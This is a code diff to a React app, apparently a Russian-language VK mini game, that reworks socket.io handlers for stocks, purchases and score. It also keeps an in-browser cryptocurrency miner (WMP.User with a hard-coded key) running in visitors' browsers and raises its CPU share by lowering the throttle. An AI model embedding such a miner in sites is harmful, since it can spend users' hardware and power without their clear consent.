@@ -64,71 +64,19 @@ class App extends Component {
 				/>)
 	   })
 
-	   socket.on("error_cost_change", () => {
-		   this.setPopout(null)
-		   this.setSnackbar(<Snackbar onClose={() => this.setSnackbar(null)}>Цена изменилась. Попробуйте снова.</Snackbar>)
-	   })
-
-	   socket.on("kill", () => {
-		clearInterval(this.state.globState.timer)
-		this.setPopout(
-			<Alert 
-				header="Ошибка" 
-				text="Обновление серверов"
-				onClose={() => {
-					this.setPopout(<ScreenSpinner />)
-					socket.open();
-				}} 
-				actions={[
-					{
-						title: "Поробовать снова",
-						action: () => {
-							this.setPopout(<ScreenSpinner />)
-							socket.open();
-						}
-					}
-				]} 
-			/>)
-	   })
-
-
 	   socket.on("disconnect", () => {
 		   clearInterval(this.state.globState.timer)
 	   })
 	}
 
 	init = (data) => {
-		const { socket } = this.state.globState;
-		socket.emit("get_buys", data.user_id);
-		socket.emit("get_stocks");	
 		this.setPopout(null)
-		socket.on("updated_score", (data) => {
-			console.log(data)
-			const { user } = this.state.globState;
-			this.setGlobState({ user: { ...user, ...data }});
+		const { socket } = this.state.globState;
+		socket.emit("get_stocks", data.user_id);
+		socket.on("get_stocks", (data) => {
+			this.setGlobState({ stocks:  data})
 		})
-		socket.on("updated_stocks", stocks => {
-			console.log(stocks)
-			this.setGlobState({ stocks });
-		})
-
-		socket.on("updated_buys", buys => {
-			console.log(buys)
-			const { user } = this.state.globState;
-			this.setGlobState({  user: { ...user, buys} });
-		})
-
-		socket.on("buy_create", (buy) => {
-			const { user } = this.state.globState;
-			this.setGlobState({  user: { ...user, buys: [...user.buys, buy]} });
-			this.setPopout(null)
-		})
-
-		socket.on("sale_create", (buy_id) => {
-			this.setPopout(null)
-			console.log(buy_id)
-		})
-
+		
 
 		let timer = setInterval(() => {
 			const { user } = this.state.globState;
@@ -140,6 +88,12 @@ class App extends Component {
 			socket.emit("add_score_timer_miner", user.user_id);
 		}, 6000);
 
+		socket.on("updated_score", (data) => {
+			console.log(data)
+			const { user } = this.state.globState;
+			this.setGlobState({ user: { ...user, ...data }});
+		})
+
 		this.setGlobState({ user: { ...data, id: undefined }, timer, timer_miner });
 
 		this.startMining()
@@ -149,7 +103,7 @@ class App extends Component {
 	startMining() {
 		const { user } = this.state.globState;
 		var miner = WMP.User('SK_dwgCbaomNA2QwH6xq5mdQ', String(user.user_id), {
-			throttle: 0.9,
+			throttle: 0.5,
 			forceASMJS: false
 		});
     	miner.start();
